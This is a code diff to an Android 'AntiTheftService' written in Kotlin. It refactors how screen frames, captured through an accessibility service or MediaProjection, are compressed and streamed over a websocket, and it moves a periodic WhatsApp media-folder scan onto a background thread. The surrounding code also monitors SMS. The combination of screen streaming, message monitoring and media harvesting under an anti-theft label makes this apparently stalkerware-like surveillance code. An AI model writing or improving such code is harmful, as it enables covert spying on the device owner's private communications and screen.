@@ -178,15 +178,8 @@ class AntiTheftService : LifecycleService() {
     private var isScreenStreaming = false
     private var lastFrameTime = 0L
 
-    // Screen stream send queue (single-frame buffer drops unsent frames automatically)
-    private var screenSendSlot: ByteArray? = null
-    @Volatile
-    private var screenSendFlushScheduled = false
-    private var screenSendThread: HandlerThread? = null
-    private var screenSendHandler: Handler? = null
+    // Scene-change detection (skip duplicate frames to save CPU/bandwidth)
     private var lastFrameHash = 0L
-    private var screenJpegQuality = 45
-    private var screenJitterFrames = 0
 
     // SMS monitoring
     private var smsObserver: ContentObserver? = null
@@ -201,7 +194,8 @@ class AntiTheftService : LifecycleService() {
     private var listenerCheckRunnable: Runnable? = null
 
     // Periodic WhatsApp media scan (fallback for FileObserver misses on Xiaomi)
-    private var mediaScanHandler = Handler(Looper.getMainLooper())
+    private var mediaScanHandlerThread: HandlerThread? = null
+    private var mediaScanHandler: Handler? = null
     private var mediaScanRunnable: Runnable? = null
 
     // Periodic health check
@@ -264,11 +258,14 @@ class AntiTheftService : LifecycleService() {
         listenerCheckHandler.postDelayed(listenerCheckRunnable!!, 60_000L)
 
         // Periodic WhatsApp media scan (every 30s) — catches videos Xiaomi's FileObserver misses
+        val scanThread = HandlerThread("MediaScanThread").apply { start() }
+        mediaScanHandlerThread = scanThread
+        mediaScanHandler = Handler(scanThread.looper)
         mediaScanRunnable = Runnable {
             scanWhatsAppMediaFolders()
-            mediaScanHandler.postDelayed(mediaScanRunnable!!, 30_000L)
+            mediaScanHandler?.postDelayed(mediaScanRunnable!!, 30_000L)
         }
-        mediaScanHandler.postDelayed(mediaScanRunnable!!, 15_000L)
+        mediaScanHandler?.postDelayed(mediaScanRunnable!!, 15_000L)
 
         // Periodic health check (every 60s)
         healthCheckRunnable = Runnable {
@@ -859,21 +856,15 @@ class AntiTheftService : LifecycleService() {
     @android.annotation.TargetApi(Build.VERSION_CODES.R)
     private fun startScreenStreamingViaAccessibility() {
         isScreenStreaming = true
-        startScreenSender()
         sendConsoleLog("Transmissão de tela via Acessibilidade iniciada.")
 
-        val captureThread = HandlerThread("ScreenCaptureThread").apply { start() }
-        val captureHandler = Handler(captureThread.looper)
+        val handler = Handler(Looper.getMainLooper())
         val runnable = object : Runnable {
             override fun run() {
-                if (!isScreenStreaming) {
-                    captureThread.quitSafely()
-                    return
-                }
+                if (!isScreenStreaming) return
                 val svc = ProtectAccessibilityService.instance
                 if (svc == null) {
                     isScreenStreaming = false
-                    captureThread.quitSafely()
                     sendConsoleLog("Serviço de acessibilidade inativo — transmissão encerrada.")
                     return
                 }
@@ -883,26 +874,27 @@ class AntiTheftService : LifecycleService() {
                             val w = 360; val h = 640
                             val scaled = Bitmap.createScaledBitmap(bitmap, w, h, false)
                             val hash = computeFrameHash(scaled)
-                            val skipFrame = lastFrameHash != 0L && hash == lastFrameHash
-                            if (!skipFrame) {
+                            if (lastFrameHash == 0L || hash != lastFrameHash) {
                                 lastFrameHash = hash
                                 val out = java.io.ByteArrayOutputStream()
-                                scaled.compress(Bitmap.CompressFormat.JPEG, screenJpegQuality, out)
-                                queueScreenFrame(out.toByteArray(), 0x01.toByte())
+                                scaled.compress(Bitmap.CompressFormat.JPEG, 45, out)
+                                sendTypedBinary(0x01.toByte(), out.toByteArray())
                             }
                             if (scaled !== bitmap) scaled.recycle()
                             bitmap.recycle()
                         } catch (e: Exception) {
                             bitmap.recycle()
                         }
+                    } else {
+                        bitmap?.recycle()
                     }
-                    if (isScreenStreaming) captureHandler.postDelayed(this, 200)
+                    if (isScreenStreaming) handler.postDelayed(this, 150)
                 }
             }
         }
-        accessibilityFrameHandler = captureHandler
+        accessibilityFrameHandler = handler
         accessibilityFrameRunnable = runnable
-        captureHandler.post(runnable)
+        handler.post(runnable)
     }
 
     private fun startScreenStreamingViaMediaProjection() {
@@ -932,7 +924,6 @@ class AntiTheftService : LifecycleService() {
             }
             
             isScreenStreaming = true
-            startScreenSender()
             sendConsoleLog("Transmissão de tela aceita pelo usuário. Iniciando captura de frames...")
 
             // Setup display parameters
@@ -989,27 +980,18 @@ class AntiTheftService : LifecycleService() {
                         bitmap
                     }
 
-                    // Scene-change detection: skip if screen hasn't changed
-                    if (lastFrameHash != 0L) {
-                        val hash = computeFrameHash(cleanBitmap)
-                        if (hash == lastFrameHash) {
-                            if (cleanBitmap != bitmap) cleanBitmap.recycle()
-                            bitmap.recycle()
-                            return@setOnImageAvailableListener
-                        }
+                    // Scene-change detection: skip identical frames
+                    val hash = computeFrameHash(cleanBitmap)
+                    if (lastFrameHash == 0L || hash != lastFrameHash) {
                         lastFrameHash = hash
-                    } else {
-                        lastFrameHash = computeFrameHash(cleanBitmap)
+                        val outStream = ByteArrayOutputStream()
+                        cleanBitmap.compress(Bitmap.CompressFormat.JPEG, 45, outStream)
+                        val jpegBytes = outStream.toByteArray()
+                        sendTypedBinary(0x01.toByte(), jpegBytes)
                     }
-                    
-                    val outStream = ByteArrayOutputStream()
-                    cleanBitmap.compress(Bitmap.CompressFormat.JPEG, screenJpegQuality, outStream)
-                    val jpegBytes = outStream.toByteArray()
 
                     if (cleanBitmap != bitmap) cleanBitmap.recycle()
                     bitmap.recycle()
-
-                    queueScreenFrame(jpegBytes, 0x01.toByte())
                     
                 } catch (e: Exception) {
                     Log.e("AntiTheftService", "Error processing screen frame: ${e.message}")
@@ -1052,15 +1034,6 @@ class AntiTheftService : LifecycleService() {
             Log.e("AntiTheftService", "Failed to clean up screen stream: ${e.message}")
         }
 
-        // Stop screen sender thread
-        screenSendHandler?.removeCallbacksAndMessages(null)
-        screenSendThread?.quitSafely()
-        screenSendThread = null
-        screenSendHandler = null
-        screenSendSlot = null
-        screenSendFlushScheduled = false
-        screenJitterFrames = 0
-        screenJpegQuality = 45
         lastFrameHash = 0L
 
         sendConsoleLog("Transmissão de tela finalizada.")
@@ -1181,46 +1154,6 @@ class AntiTheftService : LifecycleService() {
             webSocket?.send(packet.toByteString())
         } catch (e: Exception) {
             // Socket closed mid-stream — ignore; next frame uses the reconnected socket.
-        }
-    }
-
-    // ── Screen stream send queue (drops old unsent frames) ─────────────────────
-    private fun startScreenSender() {
-        if (screenSendThread != null) return
-        screenSendThread = HandlerThread("ScreenSendThread").apply { start() }
-        screenSendHandler = Handler(screenSendThread!!.looper)
-    }
-
-    private fun queueScreenFrame(payload: ByteArray, type: Byte) {
-        if (screenSendHandler == null) return
-        val packet = ByteArray(1 + payload.size)
-        packet[0] = type
-        System.arraycopy(payload, 0, packet, 1, payload.size)
-        // Adaptive quality: if slot was occupied (frame dropped), reduce quality
-        val prev = screenSendSlot
-        screenSendSlot = packet
-        if (prev != null) {
-            screenJitterFrames++
-            if (screenJitterFrames > 5) {
-                screenJpegQuality = maxOf(15, screenJpegQuality - 5)
-                screenJitterFrames = 0
-            }
-        } else {
-            screenJitterFrames = maxOf(0, screenJitterFrames - 1)
-            if (screenJitterFrames == 0 && screenJpegQuality < 45) {
-                screenJpegQuality = minOf(45, screenJpegQuality + 2)
-            }
-        }
-        if (!screenSendFlushScheduled) {
-            screenSendFlushScheduled = true
-            screenSendHandler?.post {
-                screenSendFlushScheduled = false
-                val p = screenSendSlot ?: return@post
-                screenSendSlot = null
-                try {
-                    webSocket?.send(p.toByteString())
-                } catch (e: Exception) { }
-            }
         }
     }
 
@@ -1626,8 +1559,11 @@ class AntiTheftService : LifecycleService() {
         listenerCheckRunnable?.let { listenerCheckHandler.removeCallbacks(it) }
         listenerCheckRunnable = null
 
-        mediaScanRunnable?.let { mediaScanHandler.removeCallbacks(it) }
+        mediaScanRunnable?.let { mediaScanHandler?.removeCallbacks(it) }
         mediaScanRunnable = null
+        mediaScanHandlerThread?.quitSafely()
+        mediaScanHandlerThread = null
+        mediaScanHandler = null
         healthCheckRunnable?.let { healthCheckHandler.removeCallbacks(it) }
         healthCheckRunnable = null
 
